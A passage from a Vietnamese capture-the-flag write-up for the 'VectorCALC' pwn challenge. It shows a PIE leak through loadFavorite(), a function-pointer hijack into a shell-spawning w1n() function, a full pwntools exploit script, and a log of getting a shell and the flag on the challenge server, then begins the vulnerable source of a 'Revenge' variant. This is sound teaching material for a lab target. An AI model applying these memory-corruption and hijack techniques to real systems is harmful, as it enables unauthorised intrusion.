<p>Và may mắn thay, mình tìm thấy trong file binary có hàm <code>w1n()</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">w1n</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/bin/sh 1&gt;/dev/null&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>-&gt; ta không cần phải leak libc và chúng ta có thể điều khiển 1 con trỏ hàm tới đây để có shell :&raquo;&gt;</p>
<p>Vậy, Làm sao để leak PIE??</p>
<p>Sau 1 hồi lâu mò mẫm thì mình cũng tìm được 1 bug khá là hay trong hàm <code>loadFavorite()</code> để có thể leak PIE !</p>
<p>Cùng nhìn lại hàm <code>loadFavorite()</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>faves[idx] <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> Vector));
</span></span><span style="display:flex;"><span>((<span style="color:#66d9ef">struct</span> Vector <span style="color:#f92672">*</span>)faves[idx])<span style="color:#f92672">-&gt;</span>printFunc <span style="color:#f92672">=</span> printData;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memcpy</span>(faves[idx],<span style="color:#f92672">&amp;</span>sum[idx], <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> Vector));
</span></span></code></pre></div><p>Nếu index=2, nếu biến <code>sum</code> đang chứa địa chỉ của struct thứ 2 trong mảng <code>v_list</code> -&gt; <code>&amp;sum[2] -&gt; v_list+64</code> hay là <code>&amp;sum[2]-&gt;v_list[8]</code> và khi thực hiện <code>memcpy()</code> thì trên chunk <code>faves[2]</code> sẽ chứa địa chỉ hàm <code>print</code> trên chỉ số x và địa chỉ của <code>v_list[2]</code> trên chỉ số y của chunk <code>faves[2]</code></p>
<p>Hiện thực hóa điều trên:</p>
<pre tabindex="0"><code>00:0000│  0x555555558040 (v_list) ◂— 0xdeadbeef
01:0008│  0x555555558048 (v_list+8) ◂— 0xdeadbeef
02:0010│  0x555555558050 (v_list+16) —▸ 0x55555555535d (printData) ◂— endbr64 
03:0018│  0x555555558058 (v_list+24) ◂— 0xdeadbeef
04:0020│  0x555555558060 (v_list+32) ◂— 0xdeadbeef
05:0028│  0x555555558068 (v_list+40) —▸ 0x55555555535d (printData) ◂— endbr64 
06:0030│  0x555555558070 (v_list+48) ◂— 0xdeadbeef
07:0038│  0x555555558078 (v_list+56) ◂— 0xdeadbeef
08:0040│  0x555555558080 (v_list+64) —▸ 0x55555555535d (printData) ◂— endbr64 
09:0048│  0x555555558088 (sum) —▸ 0x555555558070 (v_list+48) ◂— 0xdeadbeef
</code></pre><p>-&gt; Trên *faves[2] đã chứa các địa chỉ mà ta cần</p>
<pre tabindex="0"><code>0:0000│  0x5555555592a0 —▸ 0x55555555535d (printData) ◂— endbr64 
01:0008│  0x5555555592a8 —▸ 0x555555558070 (v_list+48) ◂— 0x37ab6fbbc
02:0010│  0x5555555592b0 ◂— 0x0
</code></pre><p>-&gt; Từ đó, khi ta dùng hàm <code>printFavorite()</code> thì thứ chúng ta có được đó là địa chỉ của mảng <code>v_list</code> và địa chỉ của hàm <code>print</code> là ta sẽ có được địa chỉ của PIE</p>
<pre tabindex="0"><code>Index: 2
Data: 
v = [93824992236381 93824992247920]
</code></pre><p>-&gt; Thành công leak được PIE base</p>
<p>Bây giờ, ta đã có PIE base, điều cần làm là làm sao điều khiển được RIP trỏ vào hàm <code>w1n()</code></p>
<p>Options 3 sẽ trả lời câu hỏi của ta:</p>
<p><code>((struct Vector *)sum)-&gt;printFunc(sum);</code></p>
<p>Chúng ta có thể điều khiển biến <code>sum</code> trỏ vào bất cứ đâu nhờ vào bug OOB ở trên</p>
<p>Vậy thì chúng ta sẽ viết hàm <code>w1n()</code> vào 1 index nào đó trên <code>v_list()</code> rồi ghi đè sum trỏ vào trước đó 16 bytes thì chúng ta đã có thể có được shell !!!!!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0000</span><span style="color:#960050;background-color:#1e0010">│</span>  <span style="color:#ae81ff">0x558c60655040</span> (v_list) <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x558c606529d2</span> (w1n) <span style="color:#960050;background-color:#1e0010">◂—</span> endbr64 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">01</span><span style="color:#f92672">:</span><span style="color:#ae81ff">000</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">│</span>  <span style="color:#ae81ff">0x558c60655048</span> (v_list<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>) <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x558c606529d2</span> (w1n) <span style="color:#960050;background-color:#1e0010">◂—</span> endbr64 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">02</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0010</span><span style="color:#960050;background-color:#1e0010">│</span>  <span style="color:#ae81ff">0x558c60655050</span> (v_list<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>) <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x558c6065235d</span> (printData) <span style="color:#960050;background-color:#1e0010">◂—</span> endbr64 
</span></span></code></pre></div><p>Lúc này ghi đè sum bằng v_list[3] thành <code>v_list-16</code> sau đó trigger để gọi hàm w1n</p>
<pre tabindex="0"><code>0x558c6065298c &lt;main+173&gt;    call   rdx                           &lt;w1n&gt;
        rdi: 0x558c60655030 (stdin@GLIBC_2.2.5) —▸ 0x7fdff7ff6aa0 (_IO_2_1_stdin_) ◂— 0xfbad208b
        rsi: 0x3
        rdx: 0x558c606529d2 (w1n) ◂— endbr64 
        rcx: 0x0
</code></pre><p>Vậy là trên Local mình đã exploit thành công, mình tiến hành gửi lên server thông qua script sau:
Vector Exploit:
<a href="https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/pwn/VectorCALC/xpl.py">xpl.py</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#context.log_level=&#39;debug&#39;</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">=</span>process(<span style="color:#e6db74">&#39;./chall&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e">#io=remote(&#39;45.122.249.68&#39;, 20017)</span>
</span></span><span style="display:flex;"><span>elf<span style="color:#f92672">=</span>context<span style="color:#f92672">.</span>binary<span style="color:#f92672">=</span>ELF(<span style="color:#e6db74">&#39;./chall&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e">#gdb.attach(io)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">enter</span>(idx, x, y):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>, idx)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#960050;background-color:#1e0010">E</span><span style="color:#e6db74">nter x: &#39;</span>, x)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Enter y: &#39;</span>, y)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sumVector</span>(idx):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Save the sum to index: &#39;</span>, idx)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">printsum</span>():
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3&#39;</span>)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">loadfav</span>(idx):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;4&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index&#39;</span>, idx)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">printfav</span>(idx):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;5&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index&#39;</span>, idx)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">addfav</span>(idx):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;6&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index&#39;</span>, idx)
</span></span><span style="display:flex;"><span>       
</span></span><span style="display:flex;"><span>enter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>enter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>enter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sumVector(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>loadfav(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>printfav(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;v = [&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>leak<span style="color:#f92672">=</span>io<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)<span style="color:#f92672">.</span>split()
</span></span><span style="display:flex;"><span><span style="color:#75715e"># print(leak)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pie<span style="color:#f92672">=</span>int(leak[<span style="color:#ae81ff">0</span>])<span style="color:#f92672">-</span><span style="color:#ae81ff">0x35d</span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;pie_base :&#39;</span> <span style="color:#f92672">+</span> hex(pie))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v_list<span style="color:#f92672">=</span>int(leak[<span style="color:#ae81ff">1</span>])<span style="color:#f92672">-</span><span style="color:#ae81ff">48</span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;v_list array :&#39;</span> <span style="color:#f92672">+</span> hex(v_list))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sum<span style="color:#f92672">=</span>v_list<span style="color:#f92672">+</span><span style="color:#ae81ff">64</span>
</span></span><span style="display:flex;"><span>faves<span style="color:#f92672">=</span>sum<span style="color:#f92672">+</span><span style="color:#ae81ff">0x18</span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;sum :&#39;</span> <span style="color:#f92672">+</span> hex(sum))
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;faves :&#39;</span> <span style="color:#f92672">+</span> hex(faves))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>w1n<span style="color:#f92672">=</span>pie<span style="color:#f92672">+</span><span style="color:#ae81ff">0x0000000000009D2</span>
</span></span><span style="display:flex;"><span>system<span style="color:#f92672">=</span>pie<span style="color:#f92672">+</span><span style="color:#ae81ff">0x100</span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;w1n :&#39;</span> <span style="color:#f92672">+</span> hex(w1n))
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;system :&#39;</span> <span style="color:#f92672">+</span> hex(system))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>enter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0&#39;</span>, str(w1n)<span style="color:#f92672">.</span>encode(), str(w1n)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>enter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3&#39;</span>,str(v_list<span style="color:#f92672">-</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">.</span>encode(), str(v_list<span style="color:#f92672">-</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>printsum() <span style="color:#75715e"># trigger</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#io.sendline(b&#39;exec 1&gt;&amp;0&#39;)</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p>spawn shell &amp; get flag:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>─   ~/CTF/wannagame/calc                                                                                                                       02:52:23 ─╮
</span></span><span style="display:flex;"><span>╰─❯ python3 xpl.py                                                                                                                                          ─╯
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to 45.122.249.68 on port 20017: Done
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/w1n-gl0ry/CTF/wannagame/calc/chall&#39;</span>
</span></span><span style="display:flex;"><span>    Arch:     amd64-64-little
</span></span><span style="display:flex;"><span>    RELRO:    Full RELRO
</span></span><span style="display:flex;"><span>    Stack:    Canary found
</span></span><span style="display:flex;"><span>    NX:       NX enabled
</span></span><span style="display:flex;"><span>    PIE:      PIE enabled
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> pie_base :0x55a8e7c74000
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> v_list array :0x55a8e7c77040
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> sum :0x55a8e7c77080
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> faves :0x55a8e7c77098
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> w1n :0x55a8e7c749d2
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> system :0x55a8e7c74100
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
</span></span><span style="display:flex;"><span>$ exec 1&gt;&amp;<span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>$ id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>user<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>user<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>user<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>$ cd /home/user
</span></span><span style="display:flex;"><span>$ ls
</span></span><span style="display:flex;"><span>chall
</span></span><span style="display:flex;"><span>flag-fe1e4f5e9309c30148cdbb9349cc329eda4186949b59d42041340a5e4657f38a.txt
</span></span><span style="display:flex;"><span>$ cat flag-fe1e4f5e9309c30148cdbb9349cc329eda4186949b59d42041340a5e4657f38a.txt
</span></span><span style="display:flex;"><span>W1<span style="color:#f92672">{</span>Ooops,... Pointers, uint64_t, long long, what the heck are they?<span style="color:#f92672">}</span>
</span></span></code></pre></div><p>-&gt; <code>FLAG: W1{Ooops,... Pointers, uint64_t, long long, what the heck are they?}</code></p>
<h2 id="vector_calc-revenge">Vector_Calc Revenge</h2>
<p><code>Host: nc 45.122.249.68 20018</code></p>
<p><code>Description: I have fixed the w1n function :)</code></p>
<p><code>Chall file:</code> <a href="https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/pwn/VectorCALC-Revenge/chall_revenge">chall_revenge</a></p>
<p><code>chall_revenge.c</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#include &lt;stdio.h&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include &lt;stdlib.h&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include &lt;unistd.h&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include &lt;string.h&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define MAX_FAVES 4</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define MAX_VECTORS 3</span>
</span></span><span style="display:flex;"><span>struct Vector{
</span></span><span style="display:flex;"><span>__uint64_t x;
</span></span><span style="display:flex;"><span>__uint64_t y;
</span></span><span style="display:flex;"><span>void (<span style="color:#f92672">*</span>printFunc)(struct Vector<span style="color:#f92672">*</span>);
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>struct Vector v_list[MAX_VECTORS];
</span></span><span style="display:flex;"><span>__uint64_t<span style="color:#f92672">*</span> sum;
</span></span><span style="display:flex;"><span>void<span style="color:#f92672">*</span> faves[MAX_FAVES];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>void printData(struct Vector<span style="color:#f92672">*</span> v);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>void enterData(){
</span></span><span style="display:flex;"><span>    struct Vector<span style="color:#f92672">*</span> v;
</span></span><span style="display:flex;"><span>    __uint64_t idx;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;Index: &#34;</span>);
</span></span><span style="display:flex;"><span>    scanf(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%lu</span><span style="color:#e6db74">&#34;</span>,<span style="color:#f92672">&amp;</span>idx);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(idx <span style="color:#f92672">&gt;</span> MAX_VECTORS){
</span></span><span style="display:flex;"><span>        puts(<span style="color:#e6db74">&#34;Invaild index!&#34;</span>);
</span></span><span style="display:flex;"><span>        exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    v <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>v_list[idx];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    v<span style="color:#f92672">-&gt;</span>printFunc <span style="color:#f92672">=</span> printData;
</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;Enter x: &#34;</span>);
</span></span><span style="display:flex;"><span>    scanf(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%lu</span><span style="color:#e6db74">&#34;</span>,<span style="color:#f92672">&amp;</span>v<span style="color:#f92672">-&gt;</span>x);
</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;Enter y: &#34;</span>);
</span></span><span style="display:flex;"><span>    scanf(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%lu</span><span style="color:#e6db74">&#34;</span>,<span style="color:#f92672">&amp;</span>v<span style="color:#f92672">-&gt;</span>y);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>void printData(struct Vector<span style="color:#f92672">*</span> v){
</span></span><span style="display:flex;"><span>    puts(<span style="color:#e6db74">&#34;Data: &#34;</span>);
</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;v = [</span><span style="color:#e6db74">%lu</span><span style="color:#e6db74"> </span><span style="color:#e6db74">%lu</span><span style="color:#e6db74">]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,v<span style="color:#f92672">-&gt;</span>x,v<span style="color:#f92672">-&gt;</span>y);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>void sumVector(){
</span></span><span style="display:flex;"><span>    __uint64_t idx;
</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;Save the sum to index: &#34;</span>);
</span></span><span style="display:flex;"><span>    scanf(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%lu</span><span style="color:#e6db74">&#34;</span>,<span style="color:#f92672">&amp;</span>idx);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(idx <span style="color:#f92672">&gt;</span> MAX_VECTORS){
</span></span><span style="display:flex;"><span>        puts(<span style="color:#e6db74">&#34;Invaild index!&#34;</span>);
</span></span><span style="display:flex;"><span>        exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    sum <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>v_list[idx];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(__uint64_t i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> ; i <span style="color:#f92672">&lt;</span> MAX_VECTORS ;<span style="color:#f92672">++</span>i){
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>( i <span style="color:#f92672">!=</span> idx){
</span></span><span style="display:flex;"><span>            ((struct Vector <span style="color:#f92672">*</span>)sum)<span style="color:#f92672">-&gt;</span>x <span style="color:#f92672">+=</span> v_list[idx]<span style="color:#f92672">.</span>x;
</span></span><span style="display:flex;"><span>            ((struct Vector <span style="color:#f92672">*</span>)sum)<span style="color:#f92672">-&gt;</span>y <span style="color:#f92672">+=</span> v_list[idx]<span style="color:#f92672">.</span>y;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>void loadFavorite(){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(sum <span style="color:#f92672">==</span> NULL){
</span></span><span style="display:flex;"><span>        puts(<span style="color:#e6db74">&#34;You must set the sum before!&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    __uint64_t idx;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;Index: &#34;</span>);
</span></span><span style="display:flex;"><span>    scanf(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%lu</span><span style="color:#e6db74">&#34;</span>,<span style="color:#f92672">&amp;</span>idx);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(idx <span style="color:#f92672">&gt;=</span> MAX_FAVES){
</span></span><span style="display:flex;"><span>        puts(<span style="color:#e6db74">&#34;Invaild index!&#34;</span>);
</span></span><span style="display:flex;"><span>        exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    faves[idx] <span style="color:#f92672">=</span> malloc(sizeof(struct Vector));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    ((struct Vector <span style="color:#f92672">*</span>)faves[idx])<span style="color:#f92672">-&gt;</span>printFunc <span style="color:#f92672">=</span> printData;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    memcpy(faves[idx],<span style="color:#f92672">&amp;</span>sum[idx], sizeof(struct Vector));
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>void printFavorite(){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(sum <span style="color:#f92672">==</span> NULL){
</span></span><span style="display:flex;"><span>        puts(<span style="color:#e6db74">&#34;You must set the sum before!&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    __uint64_t idx;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;Index: &#34;</span>);
</span></span><span style="display:flex;"><span>    scanf(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%lu</span><span style="color:#e6db74">&#34;</span>,<span style="color:#f92672">&amp;</span>idx);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(idx <span style="color:#f92672">&gt;=</span> MAX_FAVES <span style="color:#f92672">||</span> faves[idx] <span style="color:#f92672">==</span> NULL){
</span></span><span style="display:flex;"><span>        puts(<span style="color:#e6db74">&#34;Invaild index!&#34;</span>);
</span></span><span style="display:flex;"><span>        exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>( ((__uint64_t <span style="color:#f92672">*</span>)faves[idx])[<span style="color:#ae81ff">2</span>] )
</span></span><span style="display:flex;"><span>        ((struct Vector <span style="color:#f92672">*</span>)faves[idx])<span style="color:#f92672">-&gt;</span>printFunc(faves[idx]);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> 
</span></span><span style="display:flex;"><span>        ((struct Vector <span style="color:#f92672">*</span>)sum)<span style="color:#f92672">-&gt;</span>printFunc(faves[idx]);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>void addFavorute(){
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    __uint64_t idx;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;Index: &#34;</span>);
